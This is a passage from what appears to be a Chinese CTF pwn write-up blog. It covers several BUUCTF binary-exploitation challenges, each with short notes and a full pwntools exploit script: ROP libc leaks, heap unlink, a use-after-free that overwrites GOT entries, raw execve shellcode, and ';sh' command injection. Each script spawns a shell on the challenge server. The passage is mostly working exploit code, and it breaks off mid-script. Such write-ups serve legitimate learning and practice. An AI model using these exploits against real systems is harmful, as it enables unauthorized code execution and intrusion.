class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import *<br>#from LibcSearcher import * <br>local_file  = <span class="hljs-string">&#x27;./pwn1&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>#remote_libc = <span class="hljs-string">&#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29156</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br><span class="hljs-keyword">se</span>      = lambda data               :r.send(data)<br><span class="hljs-keyword">sa</span>      = lambda delim,data         :r.sendafter(delim, data)<br><span class="hljs-keyword">sl</span>      = lambda data               :r.sendline(data)<br><span class="hljs-keyword">sla</span>     = lambda delim,data         :r.sendlineafter(delim, data)<br>sea     = lambda delim,data         :r.sendafter(delim, data)<br>rc      = lambda numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = lambda                    :r.recvline()<br><span class="hljs-keyword">ru</span>      = lambda delims                         :r.recvuntil(delims)<br>uu32    = lambda data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = lambda data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = lambda <span class="hljs-keyword">tag</span>, addr        :r.info(<span class="hljs-keyword">tag</span> + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.format(addr))<br>o_g_32_old = [<span class="hljs-number">0</span>x3ac3c, <span class="hljs-number">0</span>x3ac3e, <span class="hljs-number">0</span>x3ac42, <span class="hljs-number">0</span>x3ac49, <span class="hljs-number">0</span>x5faa5, <span class="hljs-number">0</span>x5faa6]<br>o_g_32 = [<span class="hljs-number">0</span>x3ac6c, <span class="hljs-number">0</span>x3ac6e, <span class="hljs-number">0</span>x3ac72, <span class="hljs-number">0</span>x3ac79, <span class="hljs-number">0</span>x5fbd5, <span class="hljs-number">0</span>x5fbd6]<br>o_g_old = [<span class="hljs-number">0</span>x45216,<span class="hljs-number">0</span>x4526a,<span class="hljs-number">0</span>xf02a4,<span class="hljs-number">0</span>xf1147]<br>o_g = [<span class="hljs-number">0</span>x45226, <span class="hljs-number">0</span>x4527a, <span class="hljs-number">0</span>xf0364, <span class="hljs-number">0</span>xf1207]<br>def <span class="hljs-keyword">debug</span>(cmd=<span class="hljs-string">&#x27;&#x27;</span>):<br>     gdb.attach(r,cmd)<br>#------------------------------<br>pop_rdi=<span class="hljs-number">0</span>x400a03<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;your choice\n&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;address:\n&#x27;</span>,str(elf.got[<span class="hljs-string">&#x27;__stack_chk_fail&#x27;</span>]))<br><span class="hljs-keyword">sa</span>(<span class="hljs-string">&#x27;content:\n&#x27;</span>,p64(<span class="hljs-number">0</span>x40090b))<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;your choice\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x110+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(<span class="hljs-number">0</span>x40090b)<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;size:\n&#x27;</span>,str(<span class="hljs-built_in">len</span>(payload)))<br><span class="hljs-keyword">sa</span>(<span class="hljs-string">&#x27;content:\n&#x27;</span>,payload)<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;your choice\n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;your choice\n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>libc_base=uu64(<span class="hljs-keyword">ru</span>(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-keyword">print</span> hex(libc_base)<br><span class="hljs-built_in">system</span>=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;your choice\n&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;address:\n&#x27;</span>,str(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]))<br><span class="hljs-keyword">sa</span>(<span class="hljs-string">&#x27;content:\n&#x27;</span>,p64(<span class="hljs-built_in">system</span>))<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;your choice\n&#x27;</span>,<span class="hljs-string">&#x27;/bin\sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>其他：</p><p>填入payload后，第一个2结束原本的main</p><p>第二个二结束__stack_chk_fail的main，再执行rop链里的puts，再返回main</p><p>（我猜）</p><h3 id="hitcon2014-stkof">hitcon2014_stkof</h3><p>参考师傅：<a href="https://blog.csdn.net/qq_41202237/article/details/108481889">(4条消息) 好好说话之unlink_hollk’s blog-CSDN博客_好好说话之unlink</a></p><p><strong>利用方法</strong>：堆溢出-&gt;伪造chunk-&gt;unlink-&gt;劫持got-&gt;泄露libc地址-&gt;开shell</p><p><strong>具体步骤</strong>：(也不具体，不是很懂，具体参考上面那位师傅   orz  )</p><p>1.申请4个堆块</p><p>0x20（任意大小，由于本题没有setbuf函数，这个chunk被夹在两个为缓冲区申请的块中，不好处理）</p><p>0x30（至少为0x30，为能绕过检查,0x8(prev_size) + 0x8(size) + 0x8(fd) + 0x8(bk) + 0x8(next_prev) + 0x8(next_size) = 0x30，这里fd，bk构造最为精巧）</p><p>0x80（至少为0x80，能分配到unsortbin）</p><p>0x30（任意大小，防止与topchunk合并）</p><p>2.堆溢出伪造一个chunk，让系统以为它是空闲的chunk，然后free触发unlink，最后就是在bss段里存chunk指针的一个指针指向这个bss段，这题里改chunk2指针的地址指向，golobal[0]=free_got ,golobal[1]=puts_got，修改chunk1，就是改golobal[0]指向的free_got里的内容为puts_plt，调用free就会调用puts，free（2）即puts（puts_got）就泄露了libc地址</p><p>3.得出system地址后，重复上述步骤，改free_got为system地址，并填入/bin/sh，开shell</p><p><strong>chunk状态检查</strong>：</p><p><strong>检查1</strong>：检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小</p><p><strong>检查2</strong>：检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0</p><p><strong>检查3</strong>：检查前后被释放chunk的fd和bk</p><p>以上三点就是检查chunk是否空闲的三大标准</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./stkof&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25134</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                     :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,strings</span>):<br>    r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(strings)))<br>    r.send(strings)<br>    r.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br><br><span class="hljs-comment">#------------------------------------------------------</span><br>target = <span class="hljs-number">0x602140</span><br>fd = target-<span class="hljs-number">0x8</span><br>bk = target<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br>add(<span class="hljs-number">0x20</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3 </span><br>add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#4</span><br>pd1=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x30</span>)+p64(fd)+p64(bk)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x90</span>)<br>edit(<span class="hljs-number">2</span>,pd1)<br>free(<span class="hljs-number">3</span>)<br>pd2=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(free_got)+p64(puts_got)<br>edit(<span class="hljs-number">2</span>,pd2)<br>edit(<span class="hljs-number">1</span>,p64(puts_plt))<br>free(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#debug()</span><br>putgot=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(putgot)<br><span class="hljs-comment">#--------------------------------------------------------</span><br>obj=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,putgot)<br>base=putgot-obj.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><span class="hljs-comment">#print hex(base)</span><br>system=base+obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-comment">#binsh=base+obj.dump(&quot;str_bin_sh&quot;)</span><br>edit(<span class="hljs-number">1</span>,p64(system))<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">4</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwnable-hacknote">pwnable_hacknote</h3><p>参考师傅：[<a href="https://www.cnblogs.com/xlrp/p/14273598.html">BUUCTF]PWN——pwnable_hacknote - Angel-Yan - 博客园 (cnblogs.com)</a></p><p>这题堆的结构很特别</p><p>利用方法：先释放两个chunk，再申请0x8大小，会申请那两个结构0x10的note块，能改后一个note块的内容，改为got表，由于本题的uaf，指针未置0，还能继续调用原本的chunk，就泄露了地址，类似步骤改note块里put函数为system，后一个填/bin/sh，“但是这样失败了但是使用连续执行多条命令的’ ; ‘，第一条执行错误会被忽略，然后执行下一条，因此可以成功将content位置覆盖成 ‘;sh\0’或||sh，同样的然后show（chunk1）就能执行system（‘sh’）得到shell了”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./hacknote&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/root/glibc-all-in-onebsubc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27024</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#---------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>        ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>        sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>        ru(<span class="hljs-string">&#x27;Note size :&#x27;</span>)<br>        sl(<span class="hljs-built_in">str</span>(size))<br>        ru(<span class="hljs-string">&#x27;Content :&#x27;</span>)<br>        sl(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>        sl(<span class="hljs-string">&#x27;2&#x27;</span>)<br>        ru(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>        sl(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>        ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>        sl(<span class="hljs-string">&#x27;3&#x27;</span>)<br>        ru(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>        sl(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#----------------------------------------------</span><br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#1</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">8</span>,p32(<span class="hljs-number">0x804862b</span>)+p32(puts_got))<span class="hljs-comment">#2</span><br>show(<span class="hljs-number">1</span>)<br>puts_addr = u32(rc(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts_addr)<br>base=puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">8</span>,p32(system)+<span class="hljs-string">&#x27;;sh\0&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>show(<span class="hljs-number">1</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-s-9">ciscn_2019_s_9</h3><p>这题没开nx，直接栈溢出写shellcode</p><p>但溢出只有50-0x20-4=10</p><p>所以栈中先填shellcode，返回地址填入本题中有的jmp_esp，然后再esp-40到call esp命令处，执行shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#r=process(&#x27;./ciscn_s_9&#x27;)</span><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26224</span>)<br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>sc=<span class="hljs-string">&#x27;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&#x27;</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">len</span>(sc)<br>jmp_esp=<span class="hljs-number">0x08048554</span><br>call=asm(<span class="hljs-string">&#x27;sub esp,40;call esp&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">len</span>(call)<br>r.sendline(sc.ljust(<span class="hljs-number">0x24</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)+p32(jmp_esp)+call)<br><br>r.interactive()<br><br><br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-shellcode">picoctf_2018_shellcode</h3><p>这里让我们输入的地方直接是ret的地址，且没开nx，直接用shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29624</span>)<br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>sc=asm(shellcraft.sh())<br>r.sendline(sc)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="npuctf-2020-easyheap">npuctf_2020_easyheap</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./npuctf_2020_easyheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25288</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span 